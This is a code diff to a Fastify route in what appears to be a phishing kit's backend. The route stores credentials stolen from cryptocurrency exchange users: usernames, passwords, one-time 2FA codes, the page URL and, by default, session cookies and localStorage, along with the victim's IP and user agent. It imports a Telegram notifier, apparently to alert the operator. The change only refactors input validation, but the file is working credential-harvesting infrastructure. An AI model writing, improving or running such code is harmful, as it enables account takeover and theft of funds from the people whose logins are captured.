@@ -9,6 +9,7 @@ import type { Pool } from 'pg'
 import { sendFailure, sendSuccess } from '../lib/api-response.js'
 import { normalizeDatabaseConnectionString } from '../lib/database-anchor.js'
 import { sendTelegramMessage } from '../lib/telegram.js'
+import { parseBody, credsBodySchema } from '../lib/schemas.js'
 
 export type CapturedCredRow = {
   id: string
@@ -155,32 +156,21 @@ export async function registerCredsRoutes(app: FastifyInstance): Promise<void> {
       }
     }
 
-    const body =
-      typeof request.body === 'object' && request.body !== null
-        ? (request.body as Record<string, unknown>)
-        : {}
+    const parsed = parseBody(credsBodySchema, request.body)
+    if (parsed.ok === false) {
+      return sendFailure(reply, 400, parsed.message, { code: 'ValidationError' })
+    }
+    const body = parsed.data
 
-    const exchange = readString(body['exchange'])
-    const username = readString(body['username']) || readString(body['email']) || readString(body['login'])
-    const password = readString(body['password'])
-    const totp =
-      readString(body['totp']) ||
-      readString(body['otp']) ||
-      readString(body['2fa']) ||
-      readString(body['mfa']) ||
-      null
-    const page_url = readOptionalString(body['page_url'])
+    const exchange = body.exchange
+    const username = body.username
+    const password = body.password
+    const totp = body.totp || body.otp || body['2fa'] || body.mfa || null
+    const page_url = body.page_url || null
 
     const captureSession = isEnvEnabled('CEX_CAPTURE_SESSION_COOKIES', true)
-    const session_cookies = captureSession ? readOptionalString(body['session_cookies']) : null
-    const local_storage = captureSession ? readOptionalString(body['local_storage']) : null
-
-    if (!exchange) {
-      return sendFailure(reply, 400, 'exchange is required', { code: 'ValidationError' })
-    }
-    if (!username || !password) {
-      return sendFailure(reply, 400, 'username and password are required', { code: 'ValidationError' })
-    }
+    const session_cookies = captureSession ? body.session_cookies || null : null
+    const local_storage = captureSession ? body.local_storage || null : null
 
     const ip = clientIp(request)
     const user_agent = readString(request.headers['user-agent']) || null
